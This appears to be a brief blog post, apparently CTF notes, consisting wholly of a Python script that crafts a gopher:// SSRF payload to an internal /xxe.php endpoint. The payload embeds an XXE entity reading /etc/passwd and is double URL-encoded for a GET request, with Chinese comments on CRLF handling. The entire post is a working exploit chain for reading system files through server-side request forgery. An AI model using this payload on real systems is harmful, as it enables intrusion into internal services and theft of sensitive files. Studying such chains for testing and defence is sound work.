---
title: gopher协议ssrf phpinput
date: 2024-07-06 15:23:16
tags:
---

```python
import urllib.parse
payload =\
"""POST /xxe.php HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Length: 163

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<root>
<name>&sp;</name>
<password>hj</password>
</root>
"""  

#注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)       # 这里因为是GET请求所以要进行两次url编码
```

